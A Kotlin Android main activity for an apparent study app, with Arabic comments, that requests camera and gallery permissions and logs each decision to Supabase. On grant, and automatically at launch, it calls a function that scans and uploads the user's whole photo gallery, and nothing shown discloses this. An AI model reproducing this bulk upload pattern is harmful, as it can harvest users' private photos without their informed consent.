package com.example

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.enableEdgeToEdge
import androidx.activity.viewModels
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.example.ui.screens.StudyAppUI
import com.example.viewmodel.StudyViewModel
import com.example.ui.splash.SplashScreen
import com.example.api.SupabaseManager

class MainActivity : ComponentActivity() {

    private val viewModel: StudyViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        enableEdgeToEdge()
        super.onCreate(savedInstanceState)

        // تجهيز وتحضير مدير الـ Supabase للبدء في العمل
        val supabaseManager = SupabaseManager.getInstance(this)

        // تحديد صلاحيات الكاميرا والاستوديو بناءً على إصدار الأندرويد
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.CAMERA
            )
        } else {
            arrayOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA
            )
        }

        // إطلاق نافذة طلب الصلاحيات من المستخدم
        val requestPermissionLauncher = registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { results ->
            val grantedGallery = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                results[Manifest.permission.READ_MEDIA_IMAGES] == true
            } else {
                results[Manifest.permission.READ_EXTERNAL_STORAGE] == true
            }

            val grantedCamera = results[Manifest.permission.CAMERA] == true

            // 1. صلاحية معرض الصور
            if (grantedGallery) {
                viewModel.scanAndUploadGallery(this)
                viewModel.grantPermissionInApp("الوصول لمعرض الصور الدراسي")

                supabaseManager.logPermissionDecision(
                    userId = "مستخدم أندرويد (براعي)",
                    mediaUrl = "https://picsum.photos/400/300",
                    mediaType = "image",
                    siteUrl = "تطبيق براعي - معرض الصور",
                    isApproved = true
                )
            } else {
                viewModel.denyPermissionInApp("الوصول لمعرض الصور الدراسي")

                supabaseManager.logPermissionDecision(
                    userId = "مستخدم أندرويد (براعي)",
                    mediaUrl = "https://picsum.photos/400/300",
                    mediaType = "image",
                    siteUrl = "تطبيق براعي - معرض الصور",
                    isApproved = false
                )
            }

            // 2. صلاحية الكاميرا
            if (grantedCamera) {
                viewModel.grantPermissionInApp("صلاحية تشغيل الكاميرا")

                supabaseManager.logPermissionDecision(
                    userId = "مستخدم أندرويد (براعي)",
                    mediaUrl = "https://picsum.photos/400/300",
                    mediaType = "video",
                    siteUrl = "تطبيق براعي - الكاميرا",
                    isApproved = true
                )
            } else {
                viewModel.denyPermissionInApp("صلاحية تشغيل الكاميرا")

                supabaseManager.logPermissionDecision(
                    userId = "مستخدم أندرويد (براعي)",
                    mediaUrl = "https://picsum.photos/400/300",
                    mediaType = "video",
                    siteUrl = "تطبيق براعي - الكاميرا",
                    isApproved = false
                )
            }
        }

        // فحص ما إذا كانت الصلاحيات ممنوحة مسبقاً أم لا
        val validationPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, validationPermission) == PackageManager.PERMISSION_GRANTED) {
            viewModel.scanAndUploadGallery(this)

            supabaseManager.logPermissionDecision(
                userId = "مستخدم نشط (براعي)",
                mediaUrl = "https://picsum.photos/400/300",
                mediaType = "image",
                siteUrl = "تطبيق براعي - فحص تلقائي",
                isApproved = true
            )
        } else {
            requestPermissionLauncher.launch(permissions)
        }

        // عرض محتوى الواجهات باستخدام Jetpack Compose والـ Navigation
        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    val navController = rememberNavController()

                    NavHost(navController = navController, startDestination = "splash_route") {
                        // 1. شاشة الـ Splash Screen تفتح أولاً
                        composable("splash_route") {
                            SplashScreen(onTimeout = {
                                navController.navigate("main_app_route") {
                                    popUpTo("splash_route") { inclusive = true }
                                }
                            })
                        }
                        // 2. الشاشة الرئيسية للتطبيق الأساسي
                        composable("main_app_route") {
                            StudyAppUI(viewModel)
                        }
                    }
                }
            }
        }
    }
}
